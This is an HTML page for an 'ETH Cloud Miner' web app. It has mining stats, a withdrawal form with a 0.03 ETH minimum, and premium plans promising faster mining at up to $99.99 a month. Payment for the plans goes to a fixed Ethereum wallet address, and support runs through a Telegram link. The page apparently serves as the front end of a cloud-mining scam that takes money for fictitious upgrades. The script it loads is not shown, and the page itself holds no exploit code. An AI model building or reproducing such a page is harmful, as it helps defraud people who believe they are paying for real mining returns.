<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ETH Miner</title>
    <link rel="stylesheet" href="style.css">
    <meta name="theme-color" content="#6c5ce7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
</head>
<body>
    <header>
        <button id="upgrade-button" class="upgrade-button">
            <svg class="upgrade-icon" viewBox="0 0 24 24">
                <path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/>
            </svg>
            Upgrade
        </button>
        <h1>ETH Cloud Miner</h1>
        <button id="history-button" class="history-button">
            <svg class="history-icon" viewBox="0 0 24 24">
                <path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/>
            </svg>
            History
        </button>
    </header>

    <div class="container">
        <div class="mining-stats">
            <div class="stat-box">
                <h3>Hash Rate</h3>
                <p><span id="hashrate">0</span> MH/s</p>
            </div>
            <div class="stat-box">
                <h3>Earnings</h3>
                <p><span id="earned">0.0000</span> ETH</p>
            </div>
            <div class="stat-box">
                <h3>Time</h3>
                <p><span id="active-time">0</span> hrs</p>
            </div>
        </div>

        <div class="mining-control">
            <button id="start-mining" class="action-button">Start Mining</button>
            <button id="stop-mining" class="action-button" disabled>Stop Mining</button>
        </div>

        <div class="withdrawal-section">
            <h2>ETH Withdrawal</h2>
            <div class="balance-info">
                <p>Balance: <span id="available-balance">0.0000</span> ETH</p>
                <p class="min-withdrawal-info">Min. withdrawal: 0.03 ETH</p>
            </div>
            <div class="withdrawal-form">
                <input type="text" id="withdrawal-address" placeholder="ETH Wallet Address">
                <input type="number" id="withdrawal-amount" placeholder="Amount (ETH)" step="0.0001" min="0.03">
                <button id="withdraw" class="action-button">Withdraw</button>
            </div>
        </div>

        <div class="support-section">
            <a href="https://t.me/komou3" class="support-button" target="_blank">
                <svg class="telegram-icon" viewBox="0 0 24 24">
                    <path d="M20.665,3.717l-17.73,6.837c-1.21,0.486-1.203,1.161-0.222,1.462l4.552,1.42l10.532-6.645c0.498-0.303,0.953-0.14,0.579,0.192l-8.533,7.701l-0.332,4.964c0.487,0,0.703-0.223,0.975-0.486l2.34-2.276l4.867,3.587c0.898,0.495,1.543,0.241,1.767-0.832l3.185-15.021C22.939,3.977,22.255,3.299,20.665,3.717z"/>
                </svg>
                Contact Support
            </a>
        </div>
    </div>

    <div id="history-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Withdrawal History</h2>
                <button class="close-button">&times;</button>
            </div>
            <div class="modal-body">
                <div id="history-list" class="history-list">
                    <!-- History items will be added here dynamically -->
                </div>
            </div>
        </div>
    </div>

    <div id="upgrade-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Premium Upgrades</h2>
                <button class="close-upgrade-modal close-button">&times;</button>
            </div>
            <div class="modal-body">
                <div class="upgrade-options">
                    <div class="upgrade-item">
                        <div class="upgrade-info">
                            <h3>Basic Plan</h3>
                            <ul class="upgrade-features">
                                <li>2x Mining Speed</li>
                                <li>Priority Support</li>
                                <li>Lower Withdrawal Fees</li>
                            </ul>
                        </div>
                        <button class="upgrade-select-button">$9.99/month</button>
                    </div>
                    
                    <div class="upgrade-item premium">
                        <div class="popular-tag">Most Popular</div>
                        <div class="upgrade-info">
                            <h3>Pro Plan</h3>
                            <ul class="upgrade-features">
                                <li>5x Mining Speed</li>
                                <li>24/7 VIP Support</li>
                                <li>Zero Withdrawal Fees</li>
                                <li>Multiple Wallet Support</li>
                            </ul>
                        </div>
                        <button class="upgrade-select-button">$24.99/month</button>
                    </div>
                    
                    <div class="upgrade-item">
                        <div class="upgrade-info">
                            <h3>Enterprise Plan</h3>
                            <ul class="upgrade-features">
                                <li>10x Mining Speed</li>
                                <li>Dedicated Account Manager</li>
                                <li>Custom Mining Setup</li>
                                <li>API Access</li>
                            </ul>
                        </div>
                        <button class="upgrade-select-button">$99.99/month</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="payment-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Payment Details</h2>
                <button class="close-payment-modal close-button">&times;</button>
            </div>
            <div class="modal-body">
                <div class="payment-instructions">
                    <p>To activate your upgrade, please send the payment to the following ETH address:</p>
                    <div class="wallet-address-container">
                        <code id="wallet-address-text">0xaED5C644f53F1cfF034c286CE67aCf33F359e48C</code>
                        <button id="wallet-address-copy" class="copy-button">
                            <svg class="copy-icon" viewBox="0 0 24 24">
                                <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
                            </svg>
                            Copy
                        </button>
                    </div>
                    <div class="payment-note">
                        <p>After sending the payment, your upgrade will be automatically activated.</p>
                        <p>For assistance, please contact support.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="app.js"></script>
</body>
</html>
